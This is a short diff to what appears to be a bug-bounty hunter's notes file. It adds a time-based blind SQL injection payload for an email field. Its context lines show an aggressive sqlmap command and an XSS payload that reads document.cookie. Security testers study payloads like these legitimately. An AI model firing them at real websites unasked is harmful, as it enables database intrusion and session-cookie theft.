@@ -154,6 +154,12 @@ sqlmap -r sql.txt --force-ssl --level 5 --risk 3 --dbs -p parameter
 
 and you have a valid SQL INJ 😎😎
 
+### Blind SQL Injection payload:
+
+```
+email=test@gmail.com'XOR(if(now()=sysdate(),sleep(5*1),0))XOR'Z
+```
+
 ### Reflected XSS On private program
 
 1-
@@ -455,7 +461,7 @@ bash JSFScan.sh -l targets.txt --all -r -o filname
 "><u>Xalgord</u><marquee onstart='prompt(document.cookie)';>XSS</marquee>
 ```
 
-
+***
 
 ![Screenshot\_2021-03-16-16-34-20-695\_com google android youtube](https://user-images.githubusercontent.com/48483027/111305580-284b7580-867d-11eb-8704-dee84bb789e9.jpg)
 
